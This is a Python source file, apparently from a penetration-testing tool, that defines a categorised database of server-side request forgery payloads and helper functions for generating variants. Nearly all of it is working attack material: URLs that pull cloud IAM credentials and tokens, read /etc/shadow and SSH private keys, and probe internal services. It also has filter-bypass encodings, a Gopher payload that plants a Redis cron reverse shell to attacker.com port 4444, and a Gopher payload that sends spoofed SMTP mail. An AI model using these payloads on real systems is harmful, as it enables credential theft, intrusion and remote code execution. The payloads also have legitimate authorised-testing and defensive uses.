#!/usr/bin/env python3
"""
SSRF Payload Database
Comprehensive collection of SSRF payloads for various scenarios and bypass techniques
"""

class SSRFPayloadDatabase:
    """Extended SSRF payload database with categorized payloads"""
    
    # Cloud metadata endpoints
    CLOUD_METADATA = [
        # AWS
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/security-groups",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        
        # Google Cloud
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        "http://metadata.google.internal/computeMetadata/v1/instance/name",
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
        "http://metadata.google.internal/computeMetadata/v1/instance/id",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
        "http://169.254.169.254/metadata/instance/compute?api-version=2017-04-02",
        "http://169.254.169.254/metadata/instance/network?api-version=2017-04-02",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        
        # DigitalOcean
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/hostname",
        "http://169.254.169.254/metadata/v1/region",
        
        # Oracle Cloud
        "http://169.254.169.254/opc/v1/instance/",
        "http://169.254.169.254/opc/v1/vnics/",
    ]
    
    # Local file access payloads
    FILE_ACCESS = [
        # Linux/Unix
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///etc/hosts",
        "file:///etc/hostname",
        "file:///proc/version",
        "file:///proc/cmdline",
        "file:///proc/self/environ",
        "file:///proc/self/fd/0",
        "file:///proc/self/fd/1",
        "file:///proc/self/fd/2",
        "file:///root/.ssh/id_rsa",
        "file:///home/user/.ssh/id_rsa",
        "file:///var/log/auth.log",
        "file:///var/log/apache2/access.log",
        "file:///var/log/nginx/access.log",
        
        # Windows
        "file:///c:/windows/system32/drivers/etc/hosts",
        "file:///c:/windows/win.ini",
        "file:///c:/windows/system.ini",
        "file:///c:/boot.ini",
        "file:///c:/windows/php.ini",
        "file:///c:/windows/my.ini",
        "file:///c:/autoexec.bat",
        "file:///c:/config.sys",
        
        # Application specific
        "file:///etc/nginx/nginx.conf",
        "file:///etc/apache2/apache2.conf",
        "file:///etc/httpd/httpd.conf",
        "file:///etc/mysql/my.cnf",
        "file:///etc/redis/redis.conf",
        "file:///etc/ssh/sshd_config",
        "file:///var/www/html/config.php",
        "file:///var/www/html/.env",
    ]
    
    # Network service probing
    NETWORK_SERVICES = [
        # Common internal services
        "http://127.0.0.1:22",     # SSH
        "http://127.0.0.1:25",     # SMTP
        "http://127.0.0.1:53",     # DNS
        "http://127.0.0.1:80",     # HTTP
        "http://127.0.0.1:110",    # POP3
        "http://127.0.0.1:143",    # IMAP
        "http://127.0.0.1:443",    # HTTPS
        "http://127.0.0.1:993",    # IMAPS
        "http://127.0.0.1:995",    # POP3S
        "http://127.0.0.1:1433",   # MSSQL
        "http://127.0.0.1:3306",   # MySQL
        "http://127.0.0.1:5432",   # PostgreSQL
        "http://127.0.0.1:6379",   # Redis
        "http://127.0.0.1:8080",   # HTTP Alt
        "http://127.0.0.1:8443",   # HTTPS Alt
        "http://127.0.0.1:9200",   # Elasticsearch
        "http://127.0.0.1:27017",  # MongoDB
        "http://127.0.0.1:11211",  # Memcached
        
        # Gopher for service interaction
        "gopher://127.0.0.1:22/_",
        "gopher://127.0.0.1:25/_",
        "gopher://127.0.0.1:6379/_",
        "gopher://127.0.0.1:11211/_",
        
        # Dict protocol
        "dict://127.0.0.1:11211/stat",
        "dict://127.0.0.1:6379/info",
    ]
    
    # IP obfuscation techniques
    IP_ENCODING = [
        # Decimal encoding
        "http://2130706433",           # 127.0.0.1
        "http://3232235521",           # 192.168.0.1
        "http://167772161",            # 10.0.0.1
        
        # Hexadecimal encoding
        "http://0x7f000001",           # 127.0.0.1
        "http://0x7f.0x0.0x0.0x1",     # 127.0.0.1
        "http://0xc0a80001",           # 192.168.0.1
        
        # Octal encoding
        "http://0177.0.0.1",           # 127.0.0.1
        "http://017700000001",         # 127.0.0.1
        "http://0300.0250.0.1",        # 192.168.0.1
        
        # Mixed encoding
        "http://127.1",                # 127.0.0.1
        "http://127.0.1",              # 127.0.0.1
        "http://127.1.1",              # 127.1.0.1
        "http://0x7f.1",               # 127.0.0.1
        
        # IPv6 representations
        "http://[::1]",                # localhost
        "http://[::ffff:127.0.0.1]",   # IPv4-mapped IPv6
        "http://[0:0:0:0:0:ffff:127.0.0.1]",
        "http://[::]",                 # All addresses
        
        # URL encoding
        "http://127%2e0%2e0%2e1",
        "http://127%252e0%252e0%252e1",
        
        # Unicode variations
        "http://127。0。0。1",          # Full-width dots
        "http://①②⑦.⓪.⓪.①",           # Unicode numbers
        "http://1②⑦.⓪.⓪.①",
    ]
    
    # Bypass techniques
    BYPASS_TECHNIQUES = [
        # URL manipulation
        "http://127.0.0.1@evil.com",
        "http://evil.com@127.0.0.1",
        "http://127.0.0.1#evil.com",
        "http://evil.com#127.0.0.1",
        "http://127.0.0.1.evil.com",
        "http://evil.com.127.0.0.1",
        "http://127.0.0.1:80@evil.com",
        "http://evil.com:80@127.0.0.1",
        
        # Protocol confusion
        "http://127.0.0.1\\@evil.com",
        "http://127.0.0.1%5c@evil.com",
        "http://127.0.0.1%5C@evil.com",
        
        # Path traversal
        "http://evil.com/..\\127.0.0.1",
        "http://evil.com/..%2f127.0.0.1",
        "http://evil.com/..%2F127.0.0.1",
        "http://evil.com/..%5c127.0.0.1",
        "http://evil.com/..%5C127.0.0.1",
        
        # Subdomain confusion
        "http://127.0.0.1.evil.com",
        "http://evil.127.0.0.1.com",
        "http://127-0-0-1.evil.com",
        "http://127_0_0_1.evil.com",
        
        # Port manipulation
        "http://127.0.0.1:80/",
        "http://127.0.0.1:443/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:22/",
        
        # Null byte injection
        "http://127.0.0.1%00.evil.com",
        "http://evil.com%00.127.0.0.1",
        
        # Case variations
        "HTTP://127.0.0.1",
        "Http://127.0.0.1",
        "hTTp://127.0.0.1",
        
        # Special characters
        "http://127.0.0.1%09",         # Tab
        "http://127.0.0.1%0a",         # Newline
        "http://127.0.0.1%0d",         # Carriage return
        "http://127.0.0.1%20",         # Space
        
        # Double encoding
        "http://127%252e0%252e0%252e1",
        "http://127%25252e0%25252e0%25252e1",
    ]
    
    # Gopher protocol payloads
    GOPHER_PAYLOADS = [
        # Redis exploitation
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a",
        
        # MySQL exploitation
        "gopher://127.0.0.1:3306/_",
        
        # SMTP exploitation
        "gopher://127.0.0.1:25/_HELO%20attacker.com%0AMAIL%20FROM:<%3Eattacker@attacker.com%3E%0ARCPT%20TO:<%3Evictim@victim.com%3E%0ADATA%0AFrom:%20attacker@attacker.com%0ATo:%20victim@victim.com%0ASubject:%20SSRF%20Test%0A%0ASSRF%20via%20Gopher%0A.%0AQUIT",
        
        # Memcached exploitation
        "gopher://127.0.0.1:11211/_stats%0aquit",
        "gopher://127.0.0.1:11211/_version%0aquit",
        
        # FastCGI exploitation
        "gopher://127.0.0.1:9000/_",
    ]
    
    # Advanced protocol payloads
    ADVANCED_PROTOCOLS = [
        # LDAP
        "ldap://127.0.0.1:389/",
        "ldaps://127.0.0.1:636/",
        
        # FTP
        "ftp://127.0.0.1:21/",
        "ftp://user:pass@127.0.0.1:21/",
        "ftps://127.0.0.1:990/",
        
        # TFTP
        "tftp://127.0.0.1:69/",
        
        # SFTP
        "sftp://127.0.0.1:22/",
        
        # SCP
        "scp://127.0.0.1:22/",
        
        # Jar protocol (Java)
        "jar:http://127.0.0.1!/",
        
        # Netdoc protocol
        "netdoc://127.0.0.1/",
        
        # JDBC
        "jdbc:h2:mem:test",
        
        # Custom schemes
        "custom://127.0.0.1/",
        "internal://127.0.0.1/",
    ]
    
    @classmethod
    def get_cloud_payloads(cls):
        """Get cloud metadata payloads"""
        return cls.CLOUD_METADATA
    
    @classmethod
    def get_file_payloads(cls):
        """Get file access payloads"""
        return cls.FILE_ACCESS
    
    @classmethod
    def get_network_payloads(cls):
        """Get network service payloads"""
        return cls.NETWORK_SERVICES
    
    @classmethod
    def get_encoding_payloads(cls):
        """Get IP encoding payloads"""
        return cls.IP_ENCODING
    
    @classmethod
    def get_bypass_payloads(cls):
        """Get bypass technique payloads"""
        return cls.BYPASS_TECHNIQUES
    
    @classmethod
    def get_gopher_payloads(cls):
        """Get Gopher protocol payloads"""
        return cls.GOPHER_PAYLOADS
    
    @classmethod
    def get_advanced_protocol_payloads(cls):
        """Get advanced protocol payloads"""
        return cls.ADVANCED_PROTOCOLS
    
    @classmethod
    def get_all_payloads(cls, collaborator_url=None):
        """Get all payloads combined"""
        payloads = []
        payloads.extend(cls.CLOUD_METADATA)
        payloads.extend(cls.FILE_ACCESS)
        payloads.extend(cls.NETWORK_SERVICES)
        payloads.extend(cls.IP_ENCODING)
        payloads.extend(cls.BYPASS_TECHNIQUES)
        payloads.extend(cls.GOPHER_PAYLOADS)
        payloads.extend(cls.ADVANCED_PROTOCOLS)
        
        # Add collaborator payloads if URL provided
        if collaborator_url:
            protocols = ['http', 'https', 'ftp', 'gopher', 'ldap']
            for protocol in protocols:
                payloads.append(f"{protocol}://{collaborator_url}")
        
        return payloads
    
    @classmethod
    def get_payloads_by_category(cls, category):
        """Get payloads by specific category"""
        categories = {
            'cloud': cls.CLOUD_METADATA,
            'file': cls.FILE_ACCESS,
            'network': cls.NETWORK_SERVICES,
            'encoding': cls.IP_ENCODING,
            'bypass': cls.BYPASS_TECHNIQUES,
            'gopher': cls.GOPHER_PAYLOADS,
            'advanced': cls.ADVANCED_PROTOCOLS
        }
        return categories.get(category.lower(), [])

# Payload generation utilities
class PayloadGenerator:
    """Generate dynamic SSRF payloads"""
    
    @staticmethod
    def generate_ip_variations(ip_address):
        """Generate various IP address representations"""
        parts = ip_address.split('.')
        if len(parts) != 4:
            return []
        
        variations = []
        
        # Original
        variations.append(ip_address)
        
        # Decimal representation
        decimal = (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])
        variations.append(str(decimal))
        
        # Hex representation
        hex_full = f"0x{int(parts[0]):02x}{int(parts[1]):02x}{int(parts[2]):02x}{int(parts[3]):02x}"
        variations.append(hex_full)
        
        # Octal representation
        octal_parts = [f"0{int(part):o}" for part in parts]
        variations.append('.'.join(octal_parts))
        
        # Short forms
        if parts[1] == '0' and parts[2] == '0':
            variations.append(f"{parts[0]}.{parts[3]}")
        if parts[2] == '0':
            variations.append(f"{parts[0]}.{parts[1]}.{parts[3]}")
        
        return variations
    
    @staticmethod
    def generate_url_variations(base_url, target_ip="127.0.0.1"):
        """Generate URL variations with different bypass techniques"""
        variations = []
        
        # Basic variations
        variations.extend([
            f"http://{target_ip}",
            f"https://{target_ip}",
            f"ftp://{target_ip}",
            f"gopher://{target_ip}",
        ])
        
        # Port variations
        ports = [80, 443, 8080, 8443, 22, 25, 53, 3306, 6379, 9200]
        for port in ports:
            variations.append(f"http://{target_ip}:{port}")
        
        # Protocol case variations
        variations.extend([
            f"HTTP://{target_ip}",
            f"Http://{target_ip}",
            f"hTTp://{target_ip}",
        ])
        
        # Encoding variations
        encoded_ip = target_ip.replace('.', '%2e')
        variations.append(f"http://{encoded_ip}")
        
        double_encoded_ip = target_ip.replace('.', '%252e')
        variations.append(f"http://{double_encoded_ip}")
        
        return variations
    
    @staticmethod
    def generate_collaborator_payloads(collaborator_url):
        """Generate payloads using collaborator URL"""
        if not collaborator_url:
            return []
        
        payloads = []
        protocols = ['http', 'https', 'ftp', 'ldap', 'gopher', 'dict']
        
        for protocol in protocols:
            payloads.append(f"{protocol}://{collaborator_url}")
            payloads.append(f"{protocol}://{collaborator_url}/")
            payloads.append(f"{protocol}://{collaborator_url}/test")
            payloads.append(f"{protocol}://test.{collaborator_url}")
        
        # Add subdomain variations
        subdomains = ['test', 'admin', 'api', 'internal', 'dev']
        for subdomain in subdomains:
            payloads.append(f"http://{subdomain}.{collaborator_url}")
        
        return payloads